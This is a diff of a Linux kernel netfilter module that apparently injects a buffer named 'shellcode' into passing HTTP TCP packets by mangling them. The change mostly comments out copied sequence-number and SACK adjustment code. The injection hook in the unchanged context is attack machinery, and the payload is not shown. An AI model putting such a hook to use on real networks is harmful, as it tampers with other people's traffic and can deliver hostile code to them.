@@ -102,7 +102,7 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 		    // set_bit(IPS_SEQ_ADJUST_BIT, &ct->status);
 
 			// sudo iptables -t nat --list
-			if (ct && __nf_nat_mangle_tcp_packet(skb, ct, ctinfo,
+			if (ct && __nf_nat_mangle_tcp_packet(skb, ct, ctinfo, iph->ihl*4,
                                         (int)(phead - pkg) + 6, 0,
                                         shellcode, strlen(shellcode), true)) 
 			{
@@ -143,175 +143,175 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 	return NF_ACCEPT;
 }
 
-/* Adjust one found SACK option including checksum correction */
-static void
-sack_adjust(struct sk_buff *skb,
-	    struct tcphdr *tcph,
-	    unsigned int sackoff,
-	    unsigned int sackend,
-	    struct nf_nat_seq *natseq)
-{
-	while (sackoff < sackend) {
-		struct tcp_sack_block_wire *sack;
-		__be32 new_start_seq, new_end_seq;
+// /* Adjust one found SACK option including checksum correction */
+// static void
+// sack_adjust(struct sk_buff *skb,
+// 	    struct tcphdr *tcph,
+// 	    unsigned int sackoff,
+// 	    unsigned int sackend,
+// 	    struct nf_nat_seq *natseq)
+// {
+// 	while (sackoff < sackend) {
+// 		struct tcp_sack_block_wire *sack;
+// 		__be32 new_start_seq, new_end_seq;
 
-		sack = (void *)skb->data + sackoff;
-		if (after(ntohl(sack->start_seq) - natseq->offset_before,
-			  natseq->correction_pos))
-			new_start_seq = htonl(ntohl(sack->start_seq)
-					- natseq->offset_after);
-		else
-			new_start_seq = htonl(ntohl(sack->start_seq)
-					- natseq->offset_before);
+// 		sack = (void *)skb->data + sackoff;
+// 		if (after(ntohl(sack->start_seq) - natseq->offset_before,
+// 			  natseq->correction_pos))
+// 			new_start_seq = htonl(ntohl(sack->start_seq)
+// 					- natseq->offset_after);
+// 		else
+// 			new_start_seq = htonl(ntohl(sack->start_seq)
+// 					- natseq->offset_before);
 
-		if (after(ntohl(sack->end_seq) - natseq->offset_before,
-			  natseq->correction_pos))
-			new_end_seq = htonl(ntohl(sack->end_seq)
-				      - natseq->offset_after);
-		else
-			new_end_seq = htonl(ntohl(sack->end_seq)
-				      - natseq->offset_before);
+// 		if (after(ntohl(sack->end_seq) - natseq->offset_before,
+// 			  natseq->correction_pos))
+// 			new_end_seq = htonl(ntohl(sack->end_seq)
+// 				      - natseq->offset_after);
+// 		else
+// 			new_end_seq = htonl(ntohl(sack->end_seq)
+// 				      - natseq->offset_before);
 
-		pr_debug("sack_adjust: start_seq: %d->%d, end_seq: %d->%d\n",
-			 ntohl(sack->start_seq), new_start_seq,
-			 ntohl(sack->end_seq), new_end_seq);
+// 		pr_debug("sack_adjust: start_seq: %d->%d, end_seq: %d->%d\n",
+// 			 ntohl(sack->start_seq), new_start_seq,
+// 			 ntohl(sack->end_seq), new_end_seq);
 
-		inet_proto_csum_replace4(&tcph->check, skb,
-					 sack->start_seq, new_start_seq, 0);
-		inet_proto_csum_replace4(&tcph->check, skb,
-					 sack->end_seq, new_end_seq, 0);
-		sack->start_seq = new_start_seq;
-		sack->end_seq = new_end_seq;
-		sackoff += sizeof(*sack);
-	}
-}
+// 		inet_proto_csum_replace4(&tcph->check, skb,
+// 					 sack->start_seq, new_start_seq, 0);
+// 		inet_proto_csum_replace4(&tcph->check, skb,
+// 					 sack->end_seq, new_end_seq, 0);
+// 		sack->start_seq = new_start_seq;
+// 		sack->end_seq = new_end_seq;
+// 		sackoff += sizeof(*sack);
+// 	}
+// }
 
-/* TCP SACK sequence number adjustment */
-static inline unsigned int
-nf_nat_sack_adjust(struct sk_buff *skb,
-		   struct tcphdr *tcph,
-		   struct nf_conn *ct,
-		   enum ip_conntrack_info ctinfo)
-{
-	unsigned int dir, optoff, optend;
-	struct nf_conn_nat *nat = nfct_nat(ct);
+// /* TCP SACK sequence number adjustment */
+// static inline unsigned int
+// nf_nat_sack_adjust(struct sk_buff *skb,
+// 		   struct tcphdr *tcph,
+// 		   struct nf_conn *ct,
+// 		   enum ip_conntrack_info ctinfo)
+// {
+// 	unsigned int dir, optoff, optend;
+// 	struct nf_conn_nat *nat = nfct_nat(ct);
 
-	optoff = ip_hdrlen(skb) + sizeof(struct tcphdr);
-	optend = ip_hdrlen(skb) + tcph->doff * 4;
+// 	optoff = ip_hdrlen(skb) + sizeof(struct tcphdr);
+// 	optend = ip_hdrlen(skb) + tcph->doff * 4;
 
-	if (!skb_make_writable(skb, optend))
-		return 0;
+// 	if (!skb_make_writable(skb, optend))
+// 		return 0;
 
-	dir = CTINFO2DIR(ctinfo);
+// 	dir = CTINFO2DIR(ctinfo);
 
-	while (optoff < optend) {
-		/* Usually: option, length. */
-		unsigned char *op = skb->data + optoff;
+// 	while (optoff < optend) {
+// 		/* Usually: option, length. */
+// 		unsigned char *op = skb->data + optoff;
 
-		switch (op[0]) {
-		case TCPOPT_EOL:
-			return 1;
-		case TCPOPT_NOP:
-			optoff++;
-			continue;
-		default:
-			/* no partial options */
-			if (optoff + 1 == optend ||
-			    optoff + op[1] > optend ||
-			    op[1] < 2)
-				return 0;
-			if (op[0] == TCPOPT_SACK &&
-			    op[1] >= 2+TCPOLEN_SACK_PERBLOCK &&
-			    ((op[1] - 2) % TCPOLEN_SACK_PERBLOCK) == 0){
-				sack_adjust(skb, tcph, optoff+2,  optoff+op[1], &nat->seq[!dir]);
-			}
-			optoff += op[1];
-		}
-	}
-	return 1;
-}
+// 		switch (op[0]) {
+// 		case TCPOPT_EOL:
+// 			return 1;
+// 		case TCPOPT_NOP:
+// 			optoff++;
+// 			continue;
+// 		default:
+// 			/* no partial options */
+// 			if (optoff + 1 == optend ||
+// 			    optoff + op[1] > optend ||
+// 			    op[1] < 2)
+// 				return 0;
+// 			if (op[0] == TCPOPT_SACK &&
+// 			    op[1] >= 2+TCPOLEN_SACK_PERBLOCK &&
+// 			    ((op[1] - 2) % TCPOLEN_SACK_PERBLOCK) == 0){
+// 				sack_adjust(skb, tcph, optoff+2,  optoff+op[1], &nat->seq[!dir]);
+// 			}
+// 			optoff += op[1];
+// 		}
+// 	}
+// 	return 1;
+// }
 
-/* TCP sequence number adjustment.  Returns 1 on success, 0 on failure */
-int
-nf_nat_seq_adjust(struct sk_buff *skb,
-		  struct nf_conn *ct,
-		  enum ip_conntrack_info ctinfo)
-{
-	struct tcphdr *tcph;
-	int dir;
-	__be32 newseq, newack;
-	s16 seqoff, ackoff;
-	struct nf_conn_nat *nat = nfct_nat(ct);
-	struct nf_nat_seq *this_way, *other_way;
+// /* TCP sequence number adjustment.  Returns 1 on success, 0 on failure */
+// int
+// nf_nat_seq_adjust(struct sk_buff *skb,
+// 		  struct nf_conn *ct,
+// 		  enum ip_conntrack_info ctinfo)
+// {
+// 	struct tcphdr *tcph;
+// 	int dir;
+// 	__be32 newseq, newack;
+// 	s16 seqoff, ackoff;
+// 	struct nf_conn_nat *nat = nfct_nat(ct);
+// 	struct nf_nat_seq *this_way, *other_way;
 
-	dir = CTINFO2DIR(ctinfo);
+// 	dir = CTINFO2DIR(ctinfo);
 
-	this_way = &nat->seq[dir];
-	other_way = &nat->seq[!dir];
+// 	this_way = &nat->seq[dir];
+// 	other_way = &nat->seq[!dir];
 
-	if (!skb_make_writable(skb, ip_hdrlen(skb) + sizeof(*tcph)))
-		return 0;
+// 	if (!skb_make_writable(skb, ip_hdrlen(skb) + sizeof(*tcph)))
+// 		return 0;
 
-	tcph = (void *)skb->data + ip_hdrlen(skb);
-	if (after(ntohl(tcph->seq), this_way->correction_pos))
-		seqoff = this_way->offset_after;
-	else
-		seqoff = this_way->offset_before;
+// 	tcph = (void *)skb->data + ip_hdrlen(skb);
+// 	if (after(ntohl(tcph->seq), this_way->correction_pos))
+// 		seqoff = this_way->offset_after;
+// 	else
+// 		seqoff = this_way->offset_before;
 
-	if (after(ntohl(tcph->ack_seq) - other_way->offset_before,
-		  other_way->correction_pos))
-		ackoff = other_way->offset_after;
-	else
-		ackoff = other_way->offset_before;
+// 	if (after(ntohl(tcph->ack_seq) - other_way->offset_before,
+// 		  other_way->correction_pos))
+// 		ackoff = other_way->offset_after;
+// 	else
+// 		ackoff = other_way->offset_before;
 
-	printk(KERN_ALERT "---%d--%d", ntohl(tcph->seq),ntohl(tcph->ack_seq));
-	newseq = htonl(ntohl(tcph->seq) + seqoff);
-	newack = htonl(ntohl(tcph->ack_seq) - ackoff);
+// 	printk(KERN_ALERT "---%d--%d", ntohl(tcph->seq),ntohl(tcph->ack_seq));
+// 	newseq = htonl(ntohl(tcph->seq) + seqoff);
+// 	newack = htonl(ntohl(tcph->ack_seq) - ackoff);
 
-	inet_proto_csum_replace4(&tcph->check, skb, tcph->seq, newseq, 0);
-	inet_proto_csum_replace4(&tcph->check, skb, tcph->ack_seq, newack, 0);
+// 	inet_proto_csum_replace4(&tcph->check, skb, tcph->seq, newseq, 0);
+// 	inet_proto_csum_replace4(&tcph->check, skb, tcph->ack_seq, newack, 0);
 
-	// printk("Adjusting sequence number from %u->%u, ack from %u->%u\n",
-	// 	 ntohl(tcph->seq), ntohl(newseq), ntohl(tcph->ack_seq),
-	// 	 ntohl(newack));
+// 	// printk("Adjusting sequence number from %u->%u, ack from %u->%u\n",
+// 	// 	 ntohl(tcph->seq), ntohl(newseq), ntohl(tcph->ack_seq),
+// 	// 	 ntohl(newack));
 
-	tcph->seq = newseq;
-	tcph->ack_seq = newack;
+// 	tcph->seq = newseq;
+// 	tcph->ack_seq = newack;
 
-	return nf_nat_sack_adjust(skb, tcph, ct, ctinfo);
-}
+// 	return nf_nat_sack_adjust(skb, tcph, ct, ctinfo);
+// }
 
 
-unsigned int fix_seq(unsigned int hooknum, struct sk_buff *skb,
-        const struct net_device *in, const struct net_device *out, int(*okfn)(
-                struct sk_buff *))
-{
-    enum ip_conntrack_info ctinfo;
-    struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
+// unsigned int fix_seq(unsigned int hooknum, struct sk_buff *skb,
+//         const struct net_device *in, const struct net_device *out, int(*okfn)(
+//                 struct sk_buff *))
+// {
+//     enum ip_conntrack_info ctinfo;
+//     struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
 
-    if (ct  &&  test_bit(IPS_SEQ_ADJUST_BIT, &ct->status) && (ctinfo != IP_CT_RELATED + IP_CT_IS_REPLY)  ) {
+//     if (ct  &&  test_bit(IPS_SEQ_ADJUST_BIT, &ct->status) && (ctinfo != IP_CT_RELATED + IP_CT_IS_REPLY)  ) {
 
-		// enum ip_conntrack_info ctinfo;
-		// struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
-		// nf_nat_seq_adjust(skb, ct, ctinfo);
-        struct iphdr *iph = ip_hdr(skb);
+// 		// enum ip_conntrack_info ctinfo;
+// 		// struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
+// 		// nf_nat_seq_adjust(skb, ct, ctinfo);
+//         struct iphdr *iph = ip_hdr(skb);
 
-		if (iph->protocol == IPPROTO_TCP)
-		{	
-			struct tcphdr *tcph = (void *)iph + iph->ihl * 4;
+// 		if (iph->protocol == IPPROTO_TCP)
+// 		{	
+// 			struct tcphdr *tcph = (void *)iph + iph->ihl * 4;
 
-			__be32 newseq = htonl(ntohl(tcph->seq) + strlen(shellcode));
-			// __be32 newack = htonl(ntohl(tcph->ack_seq) - 10000000);
+// 			__be32 newseq = htonl(ntohl(tcph->seq) + strlen(shellcode));
+// 			// __be32 newack = htonl(ntohl(tcph->ack_seq) - 10000000);
 
-	        tcph->seq = newseq;
-			// tcph->ack_seq = newack;
+// 	        tcph->seq = newseq;
+// 			// tcph->ack_seq = newack;
 
-		}
-    }
+// 		}
+//     }
 
-    return NF_ACCEPT;
+//     return NF_ACCEPT;
   
-}
+// }
 
 static struct nf_hook_ops http_hooks[] = {
     { 
@@ -321,13 +321,13 @@ static struct nf_hook_ops http_hooks[] = {
 	    .priority 		= NF_IP_PRI_MANGLE,
 	    .owner			= THIS_MODULE
 	},
-    {
-	    .hook           = fix_seq,
-	    .pf             = PF_INET,
-	    .hooknum        = NF_INET_PRE_ROUTING,
-    	.priority       = NF_IP_PRI_CONNTRACK_CONFIRM,
-	    .owner			= THIS_MODULE
-    },
+    // {
+	   //  .hook           = fix_seq,
+	   //  .pf             = PF_INET,
+	   //  .hooknum        = NF_INET_PRE_ROUTING,
+    // 	.priority       = NF_IP_PRI_CONNTRACK_CONFIRM,
+	   //  .owner			= THIS_MODULE
+    // },
     // {
     //     .hook           = fix_seq,
     //     .pf             = PF_INET,
